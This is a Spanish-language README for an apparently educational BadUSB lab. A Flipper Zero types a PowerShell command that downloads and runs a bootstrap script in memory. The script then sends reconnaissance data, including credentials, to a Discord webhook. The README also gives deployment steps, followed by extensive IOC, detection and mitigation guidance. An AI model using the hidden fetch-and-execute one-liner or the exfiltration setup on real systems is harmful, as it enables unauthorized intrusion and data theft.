BadUSB post-exploitation recon lab — Flipper Zero + PowerShell + IOC analysis (educational)
# BadUSB Recon Lab

> Simulacion de ataque BadUSB con Flipper Zero contra Windows en entorno controlado.
> Proyecto educativo de seguridad ofensiva y analisis de deteccion.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
![Platform](https://img.shields.io/badge/platform-Windows-blue)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1%20%7C%207%2B-blue)

---

## Disclaimer

**Este repositorio contiene herramientas de doble uso (dual-use).**
Su uso esta destinado **exclusivamente** a investigacion, educacion y
pruebas en entornos propios y autorizados.

El autor no se hace responsable del uso indebido. Ver [DISCLAIMER.md](DISCLAIMER.md).

**Usar estas tecnicas contra sistemas sin autorizacion por escrito es ILEGAL**
en la mayoria de jurisdicciones, incluyendo Espana (art. 197 y 197 bis del Codigo Penal).

---

## Que es esto?

Un laboratorio personal para entender como funcionan los **BadUSB / HID injection**
usando un **Flipper Zero**, desarrollando un payload de reconocimiento
post-explotacion en PowerShell, y documentando:

- Como se construye y ejecuta el ataque.
- Que **huellas (IOCs)** deja en el sistema.
- Como **detectarlo** desde el lado defensivo.
- Como **mitigarlo**.
- Por que **no** continuamos con tecnicas de evasion.

El objetivo no es solo demostrar la parte ofensiva, sino tambien
**entender el ciclo completo**: ataque -> deteccion -> respuesta.

---

## Objetivos del proyecto

- [x] Payload de reconocimiento en PowerShell (identidad, sistema, red, defensas, credenciales).
- [x] Payload multi-idioma (SID para grupos, cmdlets de PowerShell en vez de comandos nativos).
- [x] Metodo de entrega via bootstrap + Gist secreto (sin limites del dialogo Ejecutar).
- [x] Generador automatico de Ducky Script (`build.ps1`).
- [x] Documentacion de deteccion por Windows Defender.
- [x] Documentacion de IOCs con capturas.
- [x] Guia de mitigacion y auditoria.
- [x] Declaracion explicita de por que no se continua con evasion.

---

## Entorno

| Componente | Detalle |
|---|---|
| Dispositivo | Flipper Zero (BadUSB) |
| Victima | Windows 11 Pro |
| PowerShell | 5.1 |
| Defensa | Windows Defender (configuracion por defecto) |
| Exfiltracion | Webhook de Discord (via Gist secreto) |
| Autor | 14ND3R ([@AndYLndR](https://github.com/AndYLndR)) |
| Contacto | 14nd3r@proton.me |

---

## Arquitectura del ataque
[Flipper Zero]
escribe en Ejecutar (Win+R):
powershell -WindowStyle Hidden -c "iex(iwr 'URL_BOOTSTRAP' -UseBasicParsing).Content"
|
v
[GitHub raw - bootstrap.ps1]
descarga el webhook desde un Gist secreto
descarga el payload.ps1 desde GitHub raw
inyecta el webhook en memoria
ejecuta el payload
|
v
[Discord] recibe los bloques de reconocimiento



### Ventajas del metodo bootstrap

- Ducky Script de ~180 caracteres (cabe en el limite de ~260 del Ejecutar).
- El webhook no esta en el repo ni en el Ducky, solo en un Gist secreto.
- No hay que regenerar el Ducky si cambia el webhook.
- Sin problemas de comillas ni de encoding.

### Limitaciones del metodo

- Requiere conexion a Internet.
- **Windows Defender lo detecta** (ver seccion de deteccion).
- Deja mas IOCs de red (dos conexiones HTTPS salientes).

---

## Estructura del repositorio
badusb-recon/
README.md
LICENSE
SECURITY.md
DISCLAIMER.md
.gitignore
build.ps1
config.example.ps1
payloads/
payload.ps1
bootstrap.ps1
generate_ducky.ps1
docs/
01-entorno.md
02-ejecucion.md
03-iocs.md
04-deteccion.md
05-mitigacion.md
screenshots/
tools/
extract_iocs.ps1

> `config.local.ps1` y los archivos generados (`payload_ducky.txt`)
> estan en `.gitignore` y **no se suben al repositorio**.

---

## Quick Start

```powershell
# 1. Clonar el repo
git clone https://github.com/AndYLndR/badusb-recon.git
cd badusb-recon

# 2. Configurar el webhook (solo la primera vez)
Copy-Item .\config.example.ps1 .\config.local.ps1
notepad .\config.local.ps1   # pega tu webhook real

# 3. Generar el Ducky Script
.\build.ps1

# 4. Copia payload_ducky.txt a la SD del Flipper (carpeta badusb/)
# 5. Desconecta el Flipper y ejecuta el payload contra el sistema objetivo

> `config.local.ps1` y los archivos generados (`payload_ducky.txt`)
> estan en `.gitignore` y **no se suben al repositorio**.

--

# Uso detallado
1. Configurar el webhook
El webhook va en un Gist secreto de GitHub (no en el repo). Para configurarlo:

Crea un Gist secreto en https://gist.github.com/ con este contenido:
{
  "webhook": "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI"
}


2.Guardalo con el nombre config.json y marca "Create secret gist".

3.Copia la URL raw del Gist.

4.Edita payloads/bootstrap.ps1 y sustituye $ConfigUrl por tu URL raw.

## 2. Generar el Ducky Script
Desde la raiz del repo:
.\build.ps1

Eso genera payload_ducky.txt en la raiz del repo, listo para cargar en el Flipper.


## 3. Ejecutar desde el Flipper
Conecta el Flipper al PC.

Copia payload_ducky.txt a la SD, carpeta badusb/.

Desconecta el Flipper.

En el Flipper: Apps -> BadUSB -> payload_ducky.txt -> Run.

Los bloques llegan a Discord en ~10-30 segundos.

```
---

# Deteccion por antivirus
Windows Defender detecta este payload como comportamiento sospechoso.
Esto es esperado y deseado en un proyecto educativo.

### Por que lo detecta
iex(iwr(...).Content) ejecuta codigo descargado en memoria
(MITRE ATT&CK: T1059.001, T1105).

La combinacion "descarga + ejecucion en memoria" es exactamente lo
que hace el malware fileless.

El flujo de bootstrap + Gist es un patron clasico de carga de payload.


### Nombre de la deteccion
Ver captura en screenshots/04-defender-detection.png.
Get-MpThreatDetection

## Por que NO lo hacemos indetectable
Porque no es el objetivo del proyecto. En un pentest real, la evasion
de AV/EDR requiere tecnicas (AMSI bypass, ofuscacion polimorfica, LOLBins,
etc.) que:

No son eticas fuera de un contrato autorizado.

No aportan valor a un portfolio de ciberseguridad responsable.

Son detectables igualmente por EDR modernos con behavioral analysis.

Lo interesante de este proyecto no es evadir, sino entender:

Como funciona el ataque.

Que IOCs genera.

Como detectarlo.

Como mitigarlo.

---

#IOCs documentados
El payload deja muchas huellas en el sistema. A continuacion se
documentan los IOCs principales con capturas y comandos para reproducirlos.

## 1. PowerShell Script Block Logging (Event ID 4104)
Que es: registra el contenido completo del script ejecutado, incluido
el codigo decodificado en memoria.

Captura: screenshots/06-event-4104.png

Como verlo:
powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50 |
    Where-Object Id -eq 4104 |
    Select-Object TimeCreated, Message |
    Format-List

## 2. Process Creation (Event ID 4688)
Que es: registra la creacion de procesos, incluida la linea de comandos
si esta habilitada la auditoria.

Captura: screenshots/07-event-4688.png

Como verlo:

powershell
Get-WinEvent -LogName Security -MaxEvents 100 |
    Where-Object Id -eq 4688 |
    Select-Object TimeCreated, Message |
    Format-List

## 3. Sysmon Event 1 (Process Create)
Que es: registra procesos con detalle extendido.

Como verlo (si Sysmon esta instalado):

powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20 |
    Where-Object Id -eq 1 |
    Where-Object { $_.Message -like "*powershell*" } |
    Select-Object TimeCreated, Message |
    Format-List

## 4. Sysmon Event 3 (Network Connection)
Que es: registra conexiones salientes.

Captura: screenshots/08-sysmon-conn.png

## 5. Sysmon Event 22 (DNS Query)
Que es: registra resoluciones DNS. Aqui se ve la consulta a
discord.com, raw.githubusercontent.com y gist.githubusercontent.com.

## 6. Prefetch
Que es: Windows guarda un .pf por cada ejecutable para acelerar
el arranque. Muestra que powershell.exe se ejecuto.

Captura: screenshots/09-prefetch.png

Como verlo:

powershell
Get-ChildItem "C:\Windows\Prefetch\POWERSHELL*.pf" |
    Select-Object Name, LastWriteTime
## 7. PSReadline History
Que es: historial de comandos tecleados en PowerShell (si esta
habilitado, viene por defecto en Windows 10/11).

Captura: screenshots/10-pshistory.png

Como verlo:

powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
## 8. USB Connected (Events 2003 / 2100)
Que es: registra cuando se inserta un dispositivo USB.

Como verlo:

powershell
Get-WinEvent -LogName System -MaxEvents 100 |
    Where-Object Id -in 2003, 2100 |
    Select-Object TimeCreated, Message |
    Format-List


---

# Mitigacion y auditoria
Incluso sin un EDR, se puede proteger y auditar el sistema.

## Habilitar Script Block Logging
Via GPO:
Computer Configuration -> Administrative Templates -> Windows Components ->
Windows PowerShell -> Turn on PowerShell Script Block Logging -> Enabled

## Habilitar Process Creation con linea de comandos
Via GPO:
Computer Configuration -> Windows Settings -> Security Settings ->
Advanced Audit Policy -> Detailed Tracking ->
Audit Process Creation -> Success and Failure

## Y en Administrative Templates -> System -> Audit Process Creation:
Include command line in process creation events -> Enabled

---

#Instalar Sysmon con config de calidad
Usar la config de SwiftOnSecurity o la de Olaf Hartong:

powershell
# Descargar Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
Expand-Archive "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\Sysmon"

### Config de SwiftOnSecurity
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "$env:TEMP\sysmonconfig.xml"

### Instalar
& "$env:TEMP\Sysmon\Sysmon64.exe" -accepteula -i "$env:TEMP\sysmonconfig.xml"

### Restringir USB masivo (GPO)
Computer Configuration -> Administrative Templates -> System ->
Removable Storage Access -> All Removable Storage classes: Deny all access -> Enabled


# Restricciones de red saliente
Proxy con inspeccion TLS.
Firewall bloqueando dominios de categorias no permitidas.
Denylist de raw.githubusercontent.com y gist.githubusercontent.com.

# Constrained Language Mode (WDAC / AppLocker)
Limita PowerShell a un subconjunto de comandos, bloqueando
Invoke-Expression, acceso a .NET, etc.

----

# Hasta aqui llegamos (a proposito)
Este proyecto podria continuar con tecnicas de evasion para hacer
el payload indetectable. Deliberadamente no lo hago.

## Por que?
Porque el objetivo no es atacar, sino entender. Y entender bien
significa:

1.Reconocer que Defender hace su trabajo. El payload es detectado,
y eso es lo correcto. Un AV que no detecta esto esta mal configurado.
2.Entender que la evasion es un arma de doble filo. Tecnicas como
AMSI bypass, ofuscacion polimorfica o LOLBins pueden sortear defensas,
pero:
  -.Son ilegales fuera de un contrato autorizado.
  -.No aportan valor a un portfolio de ciberseguridad responsable.
  -.Son detectables igualmente por EDR con analisis de comportamiento.

3.Me quedo sastifecho con todo lo que he aprendido :D


# Que habria que hacer para evadirlo? (conceptual 😉)
Existen tecnicas conocidas que no vamos a implementar:
  -.AMSI bypass (parchear amsiInitFailed en memoria).
  -.Ofuscacion polimorfica del script.
  -.Ejecucion via LOLBins (mshta, rundll32, regsvr32).
  -.Uso de C2 con cifrado y dominios con categoria legitima.

### Si te interesa este campo, estudia con responsabilidad:

  MITRE ATT&CK: TA0005 (Defense Evasion).
  Formaciones en entornos legales y autorizados.

---
# Roadmap 
☑ Payload base funcional (recon + envio a webhook).
☑ Payload multi-idioma (SID + cmdlets).
☑ Metodo de entrega via bootstrap + Gist.
☑ Generador automatico de Ducky Script (build.ps1).
☑ Documentacion de deteccion por Defender.
☑ IOCs documentados con capturas.
☑ Guia de mitigacion y auditoria.
☑ Seccion de "hasta aqui llegamos" (etica).
□ Documentar el flujo con capturas finales del Flipper (pendiente).
□ Anadir version en ingles del README (futuro).

#Pruebas realizadas ✅
☑ Ejecucion manual del payload en Windows 11 Pro (host propio).
☑ Envio correcto de bloques a webhook de Discord.
☑ Payload multi-idioma probado en Windows en espanol.
☑ Generacion del Ducky via build.ps1.
☑ Deteccion por Windows Defender documentada.
☑ IOCs extraidos y documentados con capturas.
□ Prueba desde Flipper Zero fisico (validacion en curso).

---

# Licencia 
MIT - ver LICENSE.

## Contacto
### GitHub: @AndYLndR
### Email: 14nd3r@proton.me

# Agradecimientos ⭐
·A la comunidad de seguridad ofensiva por la documentacion publica sobre BadUSB.
·A los mantenedores de Flipper Zero por el hardware.
·A los proyectos de blue team (Sysmon, SwiftOnSecurity, Olaf Hartong) por las
configuraciones de deteccion que hacen posible la parte defensiva de este lab.
·A Microsoft por la documentacion de PowerShell y Windows Defender.
·Y sobre todo a las distintas AI usadas para el desarrollo de este proyecto personal 




